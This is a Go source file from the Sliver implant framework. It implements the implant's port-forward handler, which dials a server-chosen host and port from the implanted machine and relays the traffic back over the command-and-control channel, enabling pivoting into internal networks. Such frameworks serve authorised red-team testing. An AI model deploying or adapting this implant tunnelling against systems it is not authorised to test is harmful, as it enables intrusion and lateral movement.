package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"

	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

const portfwdDialTimeout = 30 * time.Second

type portfwdContextDialer interface {
	DialContext(context.Context, string, string) (net.Conn, error)
}

// PortfwdReqHandler opens and registers one server-requested forward tunnel.
func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	handlePortfwdReq(envelope, connection, new(net.Dialer), portfwdDialTimeout)
}

func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connection, dialer portfwdContextDialer, dialTimeout time.Duration) {
	portfwdReq := &sliverpb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, portfwdResp)
		return
	}

	pending, addResult := connection.BeginTunnel(portfwdReq.TunnelID, dialTimeout)
	if addResult != transports.TunnelAdded {
		reportPortfwdError(envelope, connection, errors.New("port forward tunnel setup is no longer active"))
		return
	}
	defer pending.Cancel()

	remoteAddress := portfwdRemoteAddress(portfwdReq.Host, portfwdReq.Port)
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
	// {{end}}

	dst, err := dialer.DialContext(pending.Context(), "tcp", remoteAddress)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to dial remote address %s", err)
		// {{end}}
		reportPortfwdError(envelope, connection, err)
		return
	}
	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		var keepAliveErr error
		if portfwdReq.KeepAlive < 0 {
			keepAliveErr = conn.SetKeepAlive(false)
		} else if keepAliveErr = conn.SetKeepAlive(true); keepAliveErr == nil {
			keepAlivePeriod := 30 * time.Second
			if portfwdReq.KeepAlive > 0 {
				keepAlivePeriod = time.Duration(portfwdReq.KeepAlive) * time.Second
			}
			keepAliveErr = conn.SetKeepAlivePeriod(keepAlivePeriod)
		}
		if keepAliveErr != nil {
			_ = dst.Close()
			reportPortfwdError(envelope, connection, keepAliveErr)
			return
		}
	}

	// Add tunnel
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Creating tcp tunnel")
	// {{end}}
	tunnel := transports.NewTunnel(
		portfwdReq.TunnelID,
		dst,
		dst,
	)
	if connection.PublishTunnel(pending, tunnel) != transports.TunnelAdded {
		tunnel.Close()
		reportPortfwdError(envelope, connection, errors.New("port forward tunnel setup was canceled"))
		return
	}
	if connection.Tunnel(tunnel.ID) != tunnel {
		tunnel.Close()
		reportPortfwdError(envelope, connection, errors.New("port forward tunnel closed during setup"))
		return
	}

	// Send portfwd response
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Port:     portfwdReq.Port,
		Host:     portfwdReq.Host,
		Protocol: sliverpb.PortFwdProtoTCP,
		TunnelID: portfwdReq.TunnelID,
	})
	if !connection.SendEnvelope(&sliverpb.Envelope{
		ID:   envelope.ID,
		Data: portfwdResp,
	}) {
		connection.CloseTunnelRemote(tunnel)
		return
	}

	once := sync.Once{}
	cleanup := func(reason error) {
		once.Do(func() {
			// {{if .Config.Debug}}
			log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
			// {{end}}
			connection.CloseTunnelLocal(tunnel)
		})
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		// portfwd only uses one reader, hence the tunnel.Readers[0]
		n, err := io.Copy(tWriter, tunnel.Readers[0])
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()
}

func reportPortfwdError(envelope *sliverpb.Envelope, connection *transports.Connection, err error) {
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Response: &commonpb.Response{Err: err.Error()},
	})
	reportError(envelope, connection, portfwdResp)
}

func portfwdRemoteAddress(host string, port uint32) string {
	return net.JoinHostPort(host, strconv.FormatUint(uint64(port), 10))
}
